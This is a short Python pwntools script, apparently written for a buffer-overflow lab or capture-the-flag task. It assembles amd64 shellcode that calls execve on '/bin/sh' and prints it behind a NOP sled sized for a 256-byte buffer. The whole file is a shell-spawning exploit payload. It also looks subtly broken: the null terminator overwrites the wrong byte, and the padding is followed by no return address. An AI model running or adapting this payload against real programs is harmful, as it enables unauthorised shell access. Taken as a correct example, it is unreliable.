from pwn import *
context.arch = "amd64"

shellcode = asm("""
                jmp j2
                j1: jmp start
                j2: call j1
                .ascii "/bin/shX"
                start: pop rdi
                xor rax, rax
                mov byte [rdi+6], al
                mov al, 0x3b
                xor rsi, rsi
                xor rdx, rdx
                syscall
                """)

bufsize = 256 
nop = b"\x90"

payload = nop * (bufsize - len(shellcode) + 8 + 6) + shellcode

print(payload.decode('latin-1'))
# print(''.join(f"\\x{b:02x}" for b in payload))
